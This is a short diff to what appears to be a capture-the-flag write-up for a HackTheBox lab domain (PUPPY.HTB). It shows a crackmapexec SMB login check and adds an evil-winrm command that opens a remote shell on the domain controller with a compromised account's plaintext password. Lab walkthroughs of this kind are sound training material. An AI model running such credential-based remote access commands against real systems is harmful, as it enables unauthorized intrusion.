@@ -357,4 +357,10 @@ crackmapexec smb 10.129.232.75 -u adam.silver -p 'ChangeMe123!'
 SMB         10.129.232.75   445    DC               [+] PUPPY.HTB\adam.silver:ChangeMe123! 
 ```
 
-We have now re-enabled adam.silver's account.
+We have now re-enabled adam.silver's account and can now log into the DC using evil-winrm:
+
+```
+evil-winrm -i 10.129.232.75 -u  adam.silver -p 'ChangeMe123!'
+```
+
+## adam.silver -> steph.cooper
